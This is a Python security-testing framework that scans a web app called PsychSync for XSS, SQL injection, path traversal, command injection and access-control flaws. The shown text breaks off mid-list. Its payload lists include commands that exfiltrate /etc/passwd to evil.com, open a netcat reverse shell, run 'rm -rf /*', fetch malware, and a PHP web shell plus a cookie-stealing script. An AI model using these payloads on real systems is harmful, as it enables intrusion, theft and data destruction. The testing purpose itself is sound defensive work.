#!/usr/bin/env python3
"""
COMPREHENSIVE SECURITY VALIDATION FRAMEWORK
Enterprise-Grade Security Testing Suite for PsychSync

This suite implements comprehensive security validation including:
- Penetration Testing Simulation
- Authentication Security Testing
- Input Validation Testing
- Authorization Testing
- Data Protection Testing
- OWASP Top 10 Compliance
- Performance Security Testing
- Production Readiness Validation

Author: Security Team
Version: 1.0 Enterprise Security Suite
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import re
import secrets
import sqlite3
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlencode, urljoin

import aiohttp
import bcrypt
import jwt
import pytest


# Security test result classification
class TestResult(Enum):
    PASS = "PASS"
    FAIL = "FAIL"
    WARNING = "WARNING"
    CRITICAL = "CRITICAL"
    INFO = "INFO"


@dataclass
class SecurityTestResult:
    """Security test result with comprehensive details"""

    test_name: str
    result: TestResult
    description: str
    evidence: List[str] = field(default_factory=list)
    recommendation: Optional[str] = None
    cvss_score: Optional[float] = None
    owasp_category: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.utcnow)


class SecurityValidationFramework:
    """
    COMPREHENSIVE SECURITY VALIDATION FRAMEWORK
    Enterprise-grade security testing for PsychSync application
    """

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.results: List[SecurityTestResult] = []
        self.session = None
        self.logger = self._setup_logger()

        # Test configuration
        self.test_endpoints = {
            "auth": "/api/v1/auth/login",
            "register": "/api/v1/auth/register",
            "users": "/api/v1/users/",
            "assessments": "/api/v1/assessments/",
            "teams": "/api/v1/teams/",
            "health": "/api/v1/health",
            "admin": "/api/v1/admin",
        }

        # Attack payloads for testing
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//</SCRIPT>\"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        ]

        self.sql_injection_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR '1'='1--",
            "') OR ('1'='1--",
            "admin'--",
            "admin'/*",
            "' OR 1=1--",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users;--",
            "1' ORDER BY 1--",
            "1' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA--",
            "' OR (SELECT COUNT(*) FROM users) > 0--",
            "'; EXEC xp_cmdshell('dir'); --",
            "1'; EXEC master..xp_cmdshell 'ping attacker.com';--",
        ]

        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "/var/www/../../etc/passwd",
            "file:///etc/passwd",
            "../config/database.yml",
            "../../.env",
        ]

        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "& cat /etc/passwd",
            "`id`",
            "$(id)",
            "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
            "| nc attacker.com 4444 -e /bin/sh",
            "; rm -rf /*",
            "&& wget http://malicious.com/malware.sh",
            "|| ps aux",
        ]

    def _setup_logger(self) -> logging.Logger:
        """Setup comprehensive security testing logger"""
        logger = logging.getLogger("security_validation")
        logger.setLevel(logging.INFO)

        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)

        # File handler for detailed logs
        file_handler = logging.FileHandler("security_validation.log")
        file_handler.setLevel(logging.DEBUG)

        # Formatter
        formatter = logging.Formatter(
            "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
        )
        console_handler.setFormatter(formatter)
        file_handler.setFormatter(formatter)

        logger.addHandler(console_handler)
        logger.addHandler(file_handler)

        return logger

    async def run_all_tests(self) -> Dict[str, Any]:
        """
        EXECUTE COMPREHENSIVE SECURITY VALIDATION
        Runs all security tests and generates comprehensive report
        """
        self.logger.info("🚀 Starting Comprehensive Security Validation")

        try:
            # Create HTTP session
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(timeout=timeout)

            # Test categories
            test_categories = [
                ("🔒 Penetration Testing", self.run_penetration_tests),
                ("🔐 Authentication Security", self.test_authentication_security),
                ("🛡️ Input Validation", self.test_input_validation),
                ("👥 Authorization Testing", self.test_authorization),
                ("🔒 Data Protection", self.test_data_protection),
                ("🚀 OWASP Top 10", self.test_owasp_compliance),
                ("⚡ Performance Security", self.test_performance_security),
                ("🌐 Security Headers", self.test_security_headers),
                ("📊 Production Readiness", self.test_production_readiness),
                ("🔗 Integration Security", self.test_integration_security),
            ]

            # Execute test categories
            for category_name, test_function in test_categories:
                self.logger.info(f"\n{'='*60}")
                self.logger.info(f"Running: {category_name}")
                self.logger.info(f"{'='*60}")

                try:
                    await test_function()
                except Exception as e:
                    self.logger.error(f"Error in {category_name}: {e}")
                    self.add_result(
                        test_name=f"{category_name} Framework Error",
                        result=TestResult.CRITICAL,
                        description=f"Test framework error in {category_name}",
                        evidence=[str(e)],
                        recommendation="Fix test framework errors before proceeding",
                    )

            # Generate comprehensive report
            report = await self.generate_comprehensive_report()

            return report

        finally:
            if self.session:
                await self.session.close()

    async def run_penetration_tests(self):
        """
        PENETRATION TESTING SIMULATION
        Test for common attack vectors and vulnerabilities
        """
        self.logger.info("🔍 Starting Penetration Testing Simulation")

        # Test 1: Cross-Site Scripting (XSS)
        await self.test_xss_vulnerabilities()

        # Test 2: SQL Injection
        await self.test_sql_injection()

        # Test 3: Path Traversal
        await self.test_path_traversal()

        # Test 4: Command Injection
        await self.test_command_injection()

    async def test_xss_vulnerabilities(self):
        """Test Cross-Site Scripting vulnerabilities"""
        self.logger.info("Testing XSS vulnerabilities...")

        for payload in self.xss_payloads:
            try:
                # Test in various endpoints
                for endpoint_name, endpoint_path in self.test_endpoints.items():
                    if endpoint_name in ["users", "assessments", "teams"]:
                        # Test in query parameters
                        params = {"search": payload, "q": payload, "name": payload}

                        async with self.session.get(
                            urljoin(self.base_url, endpoint_path),
                            params=params,
                            headers={"User-Agent": "Security-Test-Scanner"},
                        ) as response:
                            content = await response.text()

                            # Check for XSS reflection
                            if payload in content and response.status == 200:
                                self.add_result(
                                    test_name=f"XSS Reflection - {endpoint_name}",
                                    result=TestResult.CRITICAL,
                                    description=f"XSS payload reflected in {endpoint_name} endpoint",
                                    evidence=[
                                        f"Payload: {payload}",
                                        f"Endpoint: {endpoint_path}",
                                    ],
                                    recommendation="Implement proper input sanitization and output encoding",
                                    cvss_score=6.1,
                                    owasp_category="A03:2021 – Injection",
                                )
                            else:
                                self.add_result(
                                    test_name=f"XSS Protection - {endpoint_name}",
                                    result=TestResult.PASS,
                                    description=f"XSS payload properly handled in {endpoint_name}",
                                    evidence=[f"Payload blocked: {payload}"],
                                )

                        # Test in POST data
                        if endpoint_name in ["users", "assessments"]:
                            post_data = {"name": payload, "description": payload}

                            async with self.session.post(
                                urljoin(self.base_url, endpoint_path),
                                json=post_data,
                                headers={"User-Agent": "Security-Test-Scanner"},
                            ) as response:
                                content = await response.text()

                                if payload in content and response.status not in [
                                    400,
                                    422,
                                ]:
                                    self.add_result(
                                        test_name=f"XSS POST Reflection - {endpoint_name}",
                                        result=TestResult.CRITICAL,
                                        description=f"XSS payload reflected in POST to {endpoint_name}",
                                        evidence=[
                                            f"Payload: {payload}",
                                            f"Status: {response.status}",
                                        ],
                                        recommendation="Validate and sanitize all POST data",
                                        cvss_score=6.1,
                                        owasp_category="A03:2021 – Injection",
                                    )

            except Exception as e:
                self.logger.error(f"Error testing XSS payload {payload}: {e}")

    async def test_sql_injection(self):
        """Test SQL Injection vulnerabilities"""
        self.logger.info("Testing SQL injection vulnerabilities...")

        for payload in self.sql_injection_payloads:
            try:
                # Test in login endpoint (most critical)
                login_data = {"username": payload, "password": "test123"}

                async with self.session.post(
                    urljoin(self.base_url, self.test_endpoints["auth"]),
                    json=login_data,
                    headers={"User-Agent": "Security-Test-Scanner"},
                ) as response:
                    # SQLi successful if authentication bypassed or database error returned
                    if response.status == 200:
                        result = await response.json()
                        if "access_token" in result:
                            self.add_result(
                                test_name="SQL Injection - Authentication Bypass",
                                result=TestResult.CRITICAL,
                                description=f"SQL injection successful in login",
                                evidence=[
                                    f"Payload: {payload}",
                                    "Authentication bypassed",
                                ],
                                recommendation="Use parameterized queries and input validation",
                                cvss_score=9.8,
                                owasp_category="A03:2021 – Injection",
                            )
                    elif response.status == 500:
                        # Check for database error in response
                        content = await response.text()
                        db_error_patterns = [
                            "syntax error",
                            "mysql",
                            "postgresql",
                            "oracle",
                            "sql",
                            "constraint",
                            "column",
                            "table",
                        ]

                        if any(
                            pattern in content.lower() for pattern in db_error_patterns
                        ):
                            self.add_result(
                                test_name="SQL Injection - Database Error Disclosure",
                                result=TestResult.CRITICAL,
                                description=f"SQL injection causing database error disclosure",
                                evidence=[
                                    f"Payload: {payload}",
                                    "Database error in response",
                                ],
                                recommendation="Implement proper error handling and input sanitization",
                                cvss_score=7.5,
                                owasp_category="A03:2021 – Injection",
                            )

                # Test in search parameters
                for endpoint_name, endpoint_path in self.test_endpoints.items():
                    if endpoint_name in ["users", "assessments", "teams"]:
                        params = {"search": payload, "filter": payload}

                        async with self.session.get(
                            urljoin(self.base_url, endpoint_path),
                            params=params,
                            headers={"User-Agent": "Security-Test-Scanner"},
                        ) as response:
                            content = await response.text()

                            # Look for database errors or unexpected data leakage
                            if "sql" in content.lower() or "syntax" in content.lower():
                                self.add_result(
                                    test_name=f"SQL Injection - {endpoint_name}",
                                    result=TestResult.CRITICAL,
                                    description=f"SQL injection vulnerability in {endpoint_name}",
                                    evidence=[
                                        f"Payload: {payload}",
                                        f"Endpoint: {endpoint_path}",
                                    ],
                                    recommendation="Use parameterized queries",
                                    cvss_score=7.5,
                                    owasp_category="A03:2021 – Injection",
                                )

            except Exception as e:
                self.logger.error(f"Error testing SQL injection payload {payload}: {e}")

    async def test_path_traversal(self):
        """Test Path Traversal vulnerabilities"""
        self.logger.info("Testing path traversal vulnerabilities...")

        for payload in self.path_traversal_payloads:
            try:
                # Test file-related endpoints
                test_endpoints = [
                    "/api/v1/files/",
                    "/api/v1/uploads/",
                    "/api/v1/static/",
                    "/api/v1/logs/",
                ]

                for endpoint in test_endpoints:
                    async with self.session.get(
                        urljoin(self.base_url, endpoint + payload),
                        headers={"User-Agent": "Security-Test-Scanner"},
                    ) as response:
                        content = await response.text()

                        # Check for file content leakage
                        file_indicators = [
                            "root:",
                            "bin/bash",
                            "system32",
                            "passwd",
                            "hosts",
                        ]

                        if any(
                            indicator in content.lower()
                            for indicator in file_indicators
                        ):
                            self.add_result(
                                test_name="Path Traversal - File Disclosure",
                                result=TestResult.CRITICAL,
                                description=f"Path traversal allowing file disclosure",
                                evidence=[
                                    f"Payload: {payload}",
                                    f"Endpoint: {endpoint}",
                                ],
                                recommendation="Implement proper path validation and sandboxing",
                                cvss_score=7.5,
                                owasp_category="A01:2021 – Broken Access Control",
                            )

                        # Check for successful file access (status 200)
                        if response.status == 200 and len(content) > 100:
                            self.add_result(
                                test_name="Path Traversal - Successful Access",
                                result=TestResult.WARNING,
                                description=f"Potential path traversal vulnerability",
                                evidence=[
                                    f"Payload: {payload}",
                                    f"Status: {response.status}",
                                ],
                                recommendation="Review file access controls",
                                cvss_score=5.3,
                                owasp_category="A01:2021 – Broken Access Control",
                            )

            except Exception as e:
                self.logger.error(
                    f"Error testing path traversal payload {payload}: {e}"
                )

    async def test_command_injection(self):
        """Test Command Injection vulnerabilities"""
        self.logger.info("Testing command injection vulnerabilities...")

        for payload in self.command_injection_payloads:
            try:
                # Test in various input fields
                test_data = {
                    "name": payload,
                    "search": payload,
                    "filename": payload,
                    "query": payload,
                }

                for field_name, payload_value in test_data.items():
                    for endpoint_name, endpoint_path in self.test_endpoints.items():
                        if endpoint_name in ["users", "assessments", "teams"]:
                            data = {field_name: payload_value}

                            async with self.session.post(
                                urljoin(self.base_url, endpoint_path),
                                json=data,
                                headers={"User-Agent": "Security-Test-Scanner"},
                            ) as response:
                                content = await response.text()

                                # Look for command output
                                command_indicators = [
                                    "uid=",
                                    "gid=",
                                    "root",
                                    "bin/",
                                    "usr/",
                                    "etc/",
                                    "total ",
                                    "drwx",
                                    "-rw-r--r--",
                                    "system32",
                                ]

                                if any(
                                    indicator in content.lower()
                                    for indicator in command_indicators
                                ):
                                    self.add_result(
                                        test_name="Command Injection - System Command Execution",
                                        result=TestResult.CRITICAL,
                                        description=f"Command injection vulnerability detected",
                                        evidence=[
                                            f"Payload: {payload}",
                                            f"Field: {field_name}",
                                        ],
                                        recommendation="Avoid OS command execution, use safe alternatives",
                                        cvss_score=9.8,
                                        owasp_category="A03:2021 – Injection",
                                    )

            except Exception as e:
                self.logger.error(
                    f"Error testing command injection payload {payload}: {e}"
                )

    async def test_authentication_security(self):
        """
        AUTHENTICATION SECURITY TESTING
        Comprehensive authentication mechanism validation
        """
        self.logger.info("🔐 Testing Authentication Security")

        # Test 1: Password Policy Enforcement
        await self.test_password_policy()

        # Test 2: Rate Limiting
        await self.test_auth_rate_limiting()

        # Test 3: JWT Token Security
        await self.test_jwt_security()

    async def test_password_policy(self):
        """Test password policy enforcement"""
        self.logger.info("Testing password policy enforcement...")

        weak_passwords = [
            "123456",
            "password",
            "qwerty",
            "abc123",
            "password123",
            "admin",
            "letmein",
            "welcome",
            "123",
            "test",
        ]

        for password in weak_passwords:
            try:
                register_data = {
                    "email": f"test{secrets.token_hex(4)}@example.com",
                    "password": password,
                    "full_name": "Test User",
                }

                async with self.session.post(
                    urljoin(self.base_url, self.test_endpoints["register"]),
                    json=register_data,
                    headers={"User-Agent": "Security-Test-Scanner"},
                ) as response:
                    if (
                        response.status == 201
                    ):  # Successfully registered with weak password
                        self.add_result(
                            test_name="Password Policy Enforcement",
                            result=TestResult.CRITICAL,
                            description=f"Weak password accepted: {password}",
                            evidence=[
                                f"Weak password: {password}",
                                "Account created successfully",
                            ],
                            recommendation="Implement strong password policy enforcement",
                            cvss_score=7.5,
                            owasp_category="A07:2021 – Identification and Authentication Failures",
                        )
                    elif response.status == 422:  # Validation error
                        result = await response.json()
                        if "password" in str(result).lower():
                            self.add_result(
                                test_name="Password Policy Validation",
                                result=TestResult.PASS,
                                description=f"Weak password properly rejected: {password}",
                                evidence=[
                                    f"Rejected password: {password}",
                                    "Validation error triggered",
                                ],
                            )

            except Exception as e:
                self.logger.error(f"Error testing password policy with {password}: {e}")

    async def test_auth_rate_limiting(self):
        """Test authentication rate limiting"""
        self.logger.info("Testing authentication rate limiting...")

        try:
            # Send multiple rapid login attempts
            login_data = {
                "email": "nonexistent@example.com",
                "password": "wrongpassword",
            }

            tasks = []
            for i in range(20):  # Send 20 rapid requests
                task = self.session.post(
                    urljoin(self.base_url, self.test_endpoints["auth"]),
                    json=login_data,
                    headers={"User-Agent": "Security-Test-Scanner"},
                )
                tasks.append(task)

            responses = await asyncio.gather(*tasks, return_exceptions=True)

            # Check for rate limiting (429 status)
            rate_limited_count = sum(
                1 for r in responses if hasattr(r, "status") and r.status == 429
            )

            if rate_limited_count > 0:
                self.add_result(
                    test_name="Authentication Rate Limiting",
                    result=TestResult.PASS,
                    description=f"Rate limiting active - {rate_limited_count} requests blocked",
                    evidence=[
                        f"Rate limited requests: {rate_limited_count}",
                        "Total requests: 20",
                    ],
                )
            else:
                self.add_result(
                    test_name="Authentication Rate Limiting",
                    result=TestResult.CRITICAL,
                    description="No rate limiting detected on authentication endpoint",
                    evidence=["20 rapid requests all processed"],
                    recommendation="Implement authentication rate limiting to prevent brute force attacks",
                    cvss_score=7.5,
                    owasp_category="A07:2021 – Identification and Authentication Failures",
                )

        except Exception as e:
            self.logger.error(f"Error testing authentication rate limiting: {e}")

    async def test_jwt_security(self):
        """Test JWT token security"""
        self.logger.info("Testing JWT token security...")

        try:
            # First, get a valid token
            login_data = {
                "email": "admin@psychsync.com",  # Assuming default admin exists
                "password": "admin123",  # Test with known credentials
            }

            async with self.session.post(
                urljoin(self.base_url, self.test_endpoints["auth"]),
                json=login_data,
                headers={"User-Agent": "Security-Test-Scanner"},
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    token = result.get("access_token")

                    if token:
                        # Test 1: JWT token structure
                        try:
                            decoded = jwt.decode(
                                token, options={"verify_signature": False}
                            )

                            # Check for insecure claims
                            if "exp" not in decoded:
                                self.add_result(
                                    test_name="JWT Expiration",
                                    result=TestResult.CRITICAL,
                                    description="JWT token without expiration claim",
                                    evidence=["Missing 'exp' claim"],
                                    recommendation="Always include expiration in JWT tokens",
                                    cvss_score=8.2,
                                    owasp_category="A07:2021 – Identification and Authentication Failures",
                                )

                            # Check token lifetime
                            if "exp" in decoded:
                                exp_time = decoded["exp"]
                                iat_time = decoded.get("iat", exp_time - 3600)
                                token_lifetime = exp_time - iat_time

                                if token_lifetime > 3600:  # More than 1 hour
                                    self.add_result(
                                        test_name="JWT Token Lifetime",
                                        result=TestResult.WARNING,
                                        description=f"JWT token lifetime too long: {token_lifetime} seconds",
                                        evidence=[
                                            f"Token lifetime: {token_lifetime} seconds"
                                        ],
                                        recommendation="Reduce JWT token lifetime to 30 minutes or less",
                                        cvss_score=5.3,
                                        owasp_category="A07:2021 – Identification and Authentication Failures",
                                    )
                                else:
                                    self.add_result(
                                        test_name="JWT Token Lifetime",
                                        result=TestResult.PASS,
                                        description=f"Appropriate JWT token lifetime: {token_lifetime} seconds",
                                        evidence=[
                                            f"Token lifetime: {token_lifetime} seconds"
                                        ],
                                    )

                        except jwt.DecodeError:
                            self.add_result(
                                test_name="JWT Token Structure",
                                result=TestResult.WARNING,
                                description="Could not decode JWT token",
                                evidence=["Decode error"],
                                recommendation="Ensure JWT tokens are properly formatted",
                            )

                else:
                    self.add_result(
                        test_name="JWT Testing Setup",
                        result=TestResult.WARNING,
                        description="Could not obtain valid JWT token for testing",
                        evidence=["Authentication failed"],
                        recommendation="Set up test credentials for JWT security testing",
                    )

        except Exception as e:
            self.logger.error(f"Error testing JWT security: {e}")

    async def test_input_validation(self):
        """Test input validation security"""
        self.logger.info("🛡️ Testing Input Validation Security")

        # Test parameter pollution
        await self.test_parameter_pollution()

        # Test content type validation
        await self.test_content_type_validation()

        # Test file upload security
        await self.test_file_upload_security()

    async def test_parameter_pollution(self):
        """Test HTTP Parameter Pollution"""
        self.logger.info("Testing HTTP Parameter Pollution...")

        try:
            polluted_params = {
                "user_id": "1",
                "user_id": "2",  # Duplicate parameter
                "role": "user",
                "role": "admin",  # Duplicate parameter
            }

            for endpoint_name, endpoint_path in self.test_endpoints.items():
                if endpoint_name in ["users", "assessments"]:
                    async with self.session.post(
                        urljoin(self.base_url, endpoint_path),
                        data=polluted_params,  # Use form data to allow duplicates
                        headers={"User-Agent": "Security-Test-Scanner"},
                    ) as response:
                        if response.status == 200:
                            self.add_result(
                                test_name="Parameter Pollution",
                                result=TestResult.WARNING,
                                description=f"Potential parameter pollution vulnerability",
                                evidence=[
                                    f"Endpoint: {endpoint_path}",
                                    "Duplicate parameters accepted",
                                ],
                                recommendation="Validate and sanitize all input parameters",
                                cvss_score=4.2,
                                owasp_category="A03:2021 – Injection",
                            )
                        else:
                            self.add_result(
                                test_name="Parameter Pollution Protection",
                                result=TestResult.PASS,
                                description=f"Parameter pollution properly handled",
                                evidence=[
                                    f"Endpoint: {endpoint_path}",
                                    f"Status: {response.status}",
                                ],
                            )

        except Exception as e:
            self.logger.error(f"Error testing parameter pollution: {e}")

    async def test_content_type_validation(self):
        """Test Content-Type validation"""
        self.logger.info("Testing Content-Type validation...")

        try:
            malicious_content_types = [
                "application/javascript",
                "text/html",
                "application/xml",
                "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            ]

            for content_type in malicious_content_types:
                test_data = {"name": "test", "description": "test"}

                async with self.session.post(
                    urljoin(self.base_url, self.test_endpoints["users"]),
                    json=test_data,
                    headers={
                        "Content-Type": content_type,
                        "User-Agent": "Security-Test-Scanner",
                    },
                ) as response:
                    if response.status == 200:
                        self.add_result(
                            test_name="Content-Type Validation",
                            result=TestResult.WARNING,
                            description=f"Potentially unsafe Content-Type accepted: {content_type}",
                            evidence=[f"Content-Type: {content_type}"],
                            recommendation="Validate Content-Type headers strictly",
                            cvss_score=3.7,
                            owasp_category="A05:2021 – Security Misconfiguration",
                        )

        except Exception as e:
            self.logger.error(f"Error testing content-type validation: {e}")

    async def test_file_upload_security(self):
        """Test file upload security"""
        self.logger.info("Testing file upload security...")

        try:
            malicious_files = {
                "malicious.php": "<?php system($_GET['cmd']); ?>",
                "shell.html": "<script>alert('XSS')</script>",
                "backdoor.js": "document.location='http://evil.com/steal?'+document.cookie",
                "huge_file": "A" * (100 * 1024 * 1024),  # 100MB file
            }

            for filename, content in malicious_files.items():
                # Test upload endpoint if exists
                upload_endpoints = [
                    "/api/v1/upload",
                    "/api/v1/files",
                    "/api/v1/attachments",
                ]

                for endpoint in upload_endpoints:
                    try:
                        data = aiohttp.FormData()
                        data.add_field(
                            "file",
                            content,
                            filename=filename,
                            content_type="application/octet-stream",
                        )

                        async with self.session.post(
                            urljoin(self.base_url, endpoint),
                            data=data,
                            headers={"User-Agent": "Security-Test-Scanner"},
                        ) as response:
                            if response.status == 200:
                                self.add_result(
                                    test_name="File Upload Security",
                                    result=TestResult.CRITICAL,
                                    description=f"Malicious file upload accepted: {filename}",
                                    evidence=[f"File: {filename}", "Upload successful"],
                                    recommendation="Implement strict file upload validation and sandboxing",
                                    cvss_score=7.5,
                                    owasp_category="A08:2021 – Software and Data Integrity Failures",
                                )

                    except aiohttp.ClientConnectorError:
                        # Endpoint doesn't exist, skip
                        continue

        except Exception as e:
            self.logger.error(f"Error testing file upload security: {e}")

    async def test_authorization(self):
        """Test authorization and access control"""
        self.logger.info("👥 Testing Authorization Security")

        # Test broken object-level authorization
        await self.test_broken_object_level_authorization()

        # Test privilege escalation
        await self.test_privilege_escalation()

    async def test_broken_object_level_authorization(self):
        """Test for broken object-level authorization"""
        self.logger.info("Testing broken object-level authorization...")

        try:
            # Test accessing other users' data
            user_ids = ["1", "2", "999", "admin"]

            for user_id in user_ids:
                for endpoint_name, endpoint_path in self.test_endpoints.items():
                    if endpoint_name in ["users", "assessments"]:
                        test_url = urljoin(self.base_url, endpoint_path + user_id)

                        async with self.session.get(
                            test_url, headers={"User-Agent": "Security-Test-Scanner"}
                        ) as response:
                            if response.status == 200:
                                result = await response.json()
                                # Check if we got actual data (not just "not found")
                                if result and not (
                                    isinstance(result, dict)
                                    and "detail" in result
                                    and "not found" in str(result).lower()
                                ):
                                    self.add_result(
                                        test_name="Broken Object-Level Authorization",
                                        result=TestResult.CRITICAL,
                                        description=f"Unauthorized access to user {user_id} data",
                                        evidence=[
                                            f"User ID: {user_id}",
                                            f"Endpoint: {endpoint_path}",
                                        ],
                                        recommendation="Implement proper object-level authorization checks",
                                        cvss_score=8.1,
                                        owasp_category="A01:2021 – Broken Access Control",
                                    )

        except Exception as e:
            self.logger.error(f"Error testing broken object-level authorization: {e}")

    async def test_privilege_escalation(self):
        """Test for privilege escalation vulnerabilities"""
        self.logger.info("Testing privilege escalation...")

        try:
            # Test admin endpoints without authentication
            admin_endpoints = [
                "/api/v1/admin",
                "/api/v1/admin/users",
                "/api/v1/admin/settings",
                "/api/v1/system/config",
            ]

            for endpoint in admin_endpoints:
                async with self.session.get(
                    urljoin(self.base_url, endpoint),
                    headers={"User-Agent": "Security-Test-Scanner"},
                ) as response:
                    if response.status == 200:
                        self.add_result(
                            test_name="Privilege Escalation",
                            result=TestResult.CRITICAL,
                            description=f"Admin endpoint accessible without authentication: {endpoint}",
                            evidence=[f"Endpoint: {endpoint}", "Status: 200"],
                            recommendation="Implement proper authentication and authorization for admin endpoints",
                            cvss_score=9.8,
                            owasp_category="A01:2021 – Broken Access Control",
                        )
                    elif response.status == 401:
                        self.add_result(
                            test_name="Admin Endpoint Protection",
                            result=TestResult.PASS,
                            description=f"Admin endpoint properly protected: {endpoint}",
                            evidence=[
                                f"Endpoint: {endpoint}",
                                f"Status: {response.status}",
                            ],
                        )

        except Exception as e:
            self.logger.error(f"Error testing privilege escalation: {e}")

    async def test_data_protection(self):
        """Test data protection and encryption"""
        self.logger.info("🔒 Testing Data Protection")

        # Test data encryption in transit
        await self.test_encryption_in_transit()

        # Test sensitive data exposure
        await self.test_sensitive_data_exposure()

    async def test_encryption_in_transit(self):
        """Test HTTPS/SSL implementation"""
        self.logger.info("Testing encryption in transit...")

        try:
            # Test if HTTPS is enforced
            if not self.base_url.startswith("https://"):
                self.add_result(
                    test_name="HTTPS Enforcement",
                    result=TestResult.CRITICAL,
                    description="Application not using HTTPS",
                    evidence=[f"Current URL: {self.base_url}"],
                    recommendation="Enforce HTTPS for all communications",
                    cvss_score=7.5,
                    owasp_category="A02:2021 – Cryptographic Failures",
                )

        except Exception as e:
            self.logger.error(f"Error testing HTTPS enforcement: {e}")

    async def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure"""
        self.logger.info("Testing sensitive data exposure...")

        try:
            # Test user endpoints for data leakage
            for endpoint_name, endpoint_path in self.test_endpoints.items():
                if endpoint_name in ["users"]:
                    async with self.session.get(
                        urljoin(self.base_url, endpoint_path),
                        headers={"User-Agent": "Security-Test-Scanner"},
                    ) as response:
                        content = await response.text()

                        # Check for sensitive data patterns
                        sensitive_patterns = [
                            r"\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b",  # Credit card
                            r"\b\d{3}-\d{2}-\d{4}\b",  # SSN
                            r"password\s*[:=]\s*['\"][^'\"]+['\"]",  # Passwords
                            r"secret\s*[:=]\s*['\"][^'\"]+['\"]",  # Secrets
                            r"token\s*[:=]\s*['\"][^'\"]+['\"]",  # Tokens
                        ]

                        for pattern in sensitive_patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                self.add_result(
                                    test_name="Sensitive Data Exposure",
                                    result=TestResult.CRITICAL,
                                    description=f"Sensitive data pattern detected in response",
                                    evidence=[
                                        f"Pattern: {pattern}",
                                        f"Endpoint: {endpoint_path}",
                                    ],
                                    recommendation="Remove sensitive data from API responses",
                                    cvss_score=7.5,
                                    owasp_category="A04:2021 – Insecure Design",
                                )

        except Exception as e:
            self.logger.error(f"Error testing sensitive data exposure: {e}")

    async def test_owasp_compliance(self):
        """Test OWASP Top 10 compliance"""
        self.logger.info("🚀 Testing OWASP Top 10 Compliance")

        # A01: Broken Access Control
        await self.test_owasp_a01()

        # A02: Cryptographic Failures
        await self.test_owasp_a02()

        # A03: Injection
        await self.test_owasp_a03()

    async def test_owasp_a01(self):
        """Test A01: Broken Access Control"""
        self.logger.info("Testing OWASP A01: Broken Access Control...")

        try:
            # Test direct object references
            test_ids = ["1", "2", "999", "0", "-1", "admin", "null"]

            for test_id in test_ids:
                for endpoint_name, endpoint_path in self.test_endpoints.items():
                    if endpoint_name in ["users", "assessments", "teams"]:
                        test_url = urljoin(self.base_url, endpoint_path + test_id)

                        async with self.session.get(
                            test_url, headers={"User-Agent": "Security-Test-Scanner"}
                        ) as response:
                            # 200 status with valid data could indicate broken access control
                            if response.status == 200:
                                self.add_result(
                                    test_name="OWASP A01 - Direct Object Reference",
                                    result=TestResult.WARNING,
                                    description=f"Potential direct object reference vulnerability",
                                    evidence=[
                                        f"ID: {test_id}",
                                        f"Endpoint: {endpoint_path}",
                                    ],
                                    recommendation="Implement proper access control checks",
                                    cvss_score=5.4,
                                    owasp_category="A01:2021 – Broken Access Control",
                                )

        except Exception as e:
            self.logger.error(f"Error testing OWASP A01: {e}")

    async def test_owasp_a02(self):
        """Test A02: Cryptographic Failures"""
        self.logger.info("Testing OWASP A02: Cryptographic Failures...")

        try:
            # Test for weak algorithms
            weak_indicators = ["md5", "sha1", "des", "rc4", "null", "none"]

            for endpoint_name, endpoint_path in self.test_endpoints.items():
                async with self.session.get(
                    urljoin(self.base_url, endpoint_path),
                    headers={"User-Agent": "Security-Test-Scanner"},
                ) as response:
                    content = await response.text()

                    for indicator in weak_indicators:
                        if indicator in content.lower():
                            self.add_result(
                                test_name="OWASP A02 - Weak Cryptography",
                                result=TestResult.WARNING,
                                description=f"Weak cryptographic indicator found: {indicator}",
                                evidence=[
                                    f"Indicator: {indicator}",
                                    f"Endpoint: {endpoint_path}",
                                ],
                                recommendation="Use strong cryptographic algorithms (AES-256, SHA-256+)",
                                cvss_score=5.9,
                                owasp_category="A02:2021 – Cryptographic Failures",
                            )

        except Exception as e:
            self.logger.error(f"Error testing OWASP A02: {e}")

    async def test_owasp_a03(self):
        """Test A03: Injection"""
        self.logger.info("Testing OWASP A03: Injection...")

        # This is partially covered by previous injection tests
        # Add additional injection vectors
        additional_payloads = [
            "{{7*7}}",  # Template injection
            "${7*7}",  # Template injection
            "#{7*7}",  # Template injection
